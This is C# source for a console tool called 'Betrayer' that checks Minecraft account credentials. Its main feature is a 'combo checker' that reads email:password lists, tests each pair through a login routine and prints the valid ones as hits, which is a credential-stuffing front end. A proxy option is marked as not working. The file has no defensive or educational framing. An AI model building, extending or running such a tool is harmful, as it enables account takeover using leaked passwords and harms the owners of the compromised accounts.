using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Betrayer
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Betrayer || Version 1.0";
            init_screen();
            menu();
        }
        static void innit()
        {
            init_screen();
            menu();
        }

        static void betgui()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("▄▄▄▄· ▄▄▄ .▄▄▄▄▄▄▄▄   ▄▄▄·  ▄· ▄▌▄▄▄ .▄▄▄  ");
            Console.WriteLine("▐█ ▀█▪▀▄.▀·•██  ▀▄ █·▐█ ▀█ ▐█▪██▌▀▄.▀·▀▄ █·");
            Console.WriteLine("▐█▀▀█▄▐▀▀▪▄ ▐█.▪▐▀▀▄ ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐▀▀▄ ");
            Console.WriteLine("██▄▪▐█▐█▄▄▌ ▐█▌·▐█•█▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌▐█•█▌");
            Console.WriteLine("·▀▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀   ▀ •  ▀▀▀ .▀  ▀");
            Console.ForegroundColor = ConsoleColor.White;
        }
        static void menu()
        {
            Console.WriteLine("[A] Minecraft");
            Console.WriteLine("[B] Proxy Checker (Not working)");
            Console.WriteLine("[C] Combo Checker mc");
            Console.WriteLine("[Z] Exit");
            Console.ForegroundColor = ConsoleColor.Red;
            string choice = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            if (choice == "A" || choice == "a")
            {
                mc();
            }
            else if ( choice == "B" || choice == "b")
            {
                innit();
            }
            else if ( choice == "C" || choice == "c")
            {
                ccmc();
            }
            else if ( choice == "Z" || choice == "z")
            {
                Console.WriteLine("Hope to see you soon :)");
                Thread.Sleep(1000);
                Environment.Exit(5);
            }
        }
        static void mc()
        {
            init_screen();
            Console.WriteLine("Please type the email");
            Console.ForegroundColor = ConsoleColor.Red;
            string user = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Please type the password");
            Console.ForegroundColor = ConsoleColor.Red;
            string pass = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.White;
            string result = auth.login(user, pass);
            init_screen();
            Console.WriteLine(result);
            retrun();
        }
        static void proxy()
        {
            init_screen();
            Console.Write("Please type the name of your ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Proxy list");
            Console.ForegroundColor = ConsoleColor.White;
            string plist = Console.ReadLine();
            var plength = File.ReadLines(@""+ plist + ".txt").Count();


        }
        static void ccmc()
        {
            var checks = 0;
            var hits = 0;
            var miss = 0;
            init_screen();
            Console.Title = "Betrayer || Checks : 0 || Hits : 0 || Miss : 0";
            Console.WriteLine("Please type the name of your file (name.txt)");
            string file = Console.ReadLine();
            if (!file.EndsWith(".txt"))
            {
                Console.WriteLine("Invalid text file please try again!");
                Thread.Sleep(2500);
                ccmc();
            }
            else if (file.EndsWith(".txt"))
            {
                try
                {
                    foreach (string line in File.ReadAllLines(file))
                    {
                        string[] temp = line.Split(':');
                        string user = temp[0];
                        string password = temp[1];
                        var result = combo.check(user, password);
                        if (result == true)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("Email :: " + user + " || Password :: " + password);
                            Console.ForegroundColor = ConsoleColor.White;
                            hits += 1;
                        }
                        else if (result == false)
                        {
                            miss += 1;
                        }
                        checks += 1;
                        Console.Title = "Betrayer || Checks : " + checks + " || Hits : " + hits + " || Miss : " + miss;
                    }
                }
                catch
                {
                    Console.WriteLine("No file found :9 \n Sending you back to the main menu");
                    Thread.Sleep(2500);
                    innit();
                }
            }
            retrun();
        }
        static void init_screen()
        {
            Console.Clear();
            betgui();
        }
        static void retrun()
        {
            Console.WriteLine("Would you like to return to the main menu? [Y/N]");
            string choice = Console.ReadLine();
            if (choice == "Y" || choice == "y")
            {
                innit();
            }
            else if (choice == "N" || choice == "n")
            {
                Console.WriteLine("Hope to see you soon :)");
                Thread.Sleep(500);
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("Not yes or no please try again :)");
                retrun();
            }
        }
    }
}
